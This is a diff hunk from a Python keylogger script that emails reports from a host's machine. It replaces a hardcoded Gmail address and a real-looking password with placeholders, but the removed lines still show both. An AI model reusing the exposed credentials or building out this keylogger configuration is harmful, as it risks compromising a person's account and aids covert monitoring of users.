@@ -12,9 +12,9 @@ from threading import Timer
 from datetime import datetime
 
 HOST = f"HOST : {os.environ['COMPUTERNAME']}"
-SENDER_EMAIL_ADDRESS = "shanmukmichael@gmail.com"
-RECEIVER_EMAIL_ADDRESS = "shanmukmichael@gmail.com"
-EMAIL_PASSWORD = "{$h@nmukS8}"
+SENDER_EMAIL_ADDRESS = "example@gmail.com"
+RECEIVER_EMAIL_ADDRESS = "example@gmail.com"
+EMAIL_PASSWORD = "your password"
 BODY = f"This message is from client {HOST}'s keylogger Application."
 
 
